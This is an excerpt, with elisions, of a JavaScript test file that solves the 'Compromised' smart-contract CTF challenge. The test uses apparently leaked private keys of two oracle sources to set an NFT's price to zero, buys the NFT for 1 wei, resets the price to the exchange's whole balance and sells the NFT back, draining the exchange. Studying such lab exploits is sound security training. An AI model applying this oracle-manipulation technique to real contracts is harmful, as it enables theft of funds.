...
describe("Compromised challenge", function () {
  ...
  const sources = [
    ...
    "0xe92401A4d3af5E446d93D11EEc806b1462b39D15", // wallet1
    "0x81A5D6E50C214044bE44cA0CB057fe119097850c", // wallet2
  ];
  ...
  it("Execution", async function () {
    ...
    const privateKeys = streams.map((stream) => {
    ...
    // Set price to 0
    const p1 = oracle.connect(wallet1).postPrice(symbol, 0);
    const p2 = oracle.connect(wallet2).postPrice(symbol, 0);

    await Promise.all([p1, p2]);

    await exchange.connect(player).buyOne({ value: 1 }); //Mint one NFT with 1 wei

    await oracle
      .connect(wallet1)
      .postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE);
    await oracle
      .connect(wallet2)
      .postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE);

    await nftToken.connect(player).approve(exchange.address, 0); //Approve exchange to manipulate NFT

    await exchange.connect(player).sellOne(0); //tokenId 0
  });
